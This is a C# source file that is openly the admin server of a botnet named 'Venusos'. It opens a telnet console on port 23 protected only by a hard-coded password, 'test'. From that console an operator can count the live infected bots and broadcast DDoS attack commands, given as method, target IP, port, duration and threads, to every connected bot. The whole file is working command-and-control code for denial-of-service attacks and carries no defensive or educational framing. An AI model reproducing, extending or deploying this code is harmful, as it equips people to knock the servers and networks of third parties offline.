using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;

namespace Venusos_Botnet_Server
{
    public class AdminsServer
    {
        public static void StartListener()
        {
            Console.WriteLine("Telnet console is avaiable on {0}:23\n\r", Tools.GetLocalIP());

            bool logged = false;
            bool just_logged = false;

            while (true)
            {
                TcpListener tcpListener = new TcpListener(Tools.GetLocalIP(), 23);
                tcpListener.Start();

                try
                {
                    int i;
                    string data;
                    byte[] bytes = new byte[256];

                    TcpClient tcpClient = tcpListener.AcceptTcpClient();
                    NetworkStream networkStream = tcpClient.GetStream();

                    Console.WriteLine("New connection request from {0}", ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address);

                    networkStream.Write(Encoding.ASCII.GetBytes("Enter password: "));

                    Stopwatch timer = new Stopwatch();
                    timer.Start();

                    while ((i = networkStream.Read(bytes)) != 0)
                    {
                        data = Encoding.ASCII.GetString(bytes, 0, i);

                        if (!logged)
                        {
                            Console.WriteLine(data);
                            if (data is "test")
                            {
                                Console.WriteLine("Client connected");
                                logged = true;
                                just_logged = true;
                            }
                            if (timer.Elapsed.TotalSeconds > 10)
                            {
                                tcpClient.Close();
                                throw new Exception("Wrong password");
                            }
                        }
                        else
                        {
                            if (just_logged)
                            {
                                networkStream.Write(Encoding.ASCII.GetBytes("Hello, type help to get more info!\n\r"));
                                just_logged = false;
                            }

                            BotsServer.tcpClients.RemoveAll(x => !x.Connected);

                            if (data.StartsWith("help"))
                            {
                                networkStream.Write(Encoding.ASCII.GetBytes("Type ddos for help with attacking,\n\rtype ping to ckeck active bots.\n\r"));
                            }
                            else if (data.StartsWith("ping"))
                            {
                                int all, alive;
                                all = alive = 0;
                                foreach (TcpClient bot in BotsServer.tcpClients)
                                {
                                    all++;
                                    if (BotsServer.Ping(bot))
                                    {
                                        alive++;
                                        networkStream.Write(Encoding.ASCII.GetBytes(((IPEndPoint)bot.Client.RemoteEndPoint).Address + " is alive\n\r"));
                                    }
                                }
                                networkStream.Write(Encoding.ASCII.GetBytes(alive + " bots are alive out of " + all + "\n\r"));
                            }
                            else if (data.StartsWith("ddos"))
                            {
                                if (data.StartsWith("ddos "))
                                {
                                    try
                                    {
                                        Command command = Tools.CreateCommand(data);
                                        foreach (TcpClient bot in BotsServer.tcpClients)
                                        {
                                            BotsServer.Send(bot, JsonSerializer.Serialize(command));
                                        }
                                    }
                                    catch (Exception e)
                                    {
                                        networkStream.Write(Encoding.ASCII.GetBytes(e.Message));
                                    }
                                }
                                else
                                {
                                    networkStream.Write(Encoding.ASCII.GetBytes("ddos [METHOD] [IP] [PORT] [DURATION] [THREADS]\n\r"));
                                }
                            }
                        }
                    }
                }
                catch
                {
                    Console.WriteLine("Client disconnected");
                }
                finally
                {
                    tcpListener.Stop();
                }
            }
        }
    }
}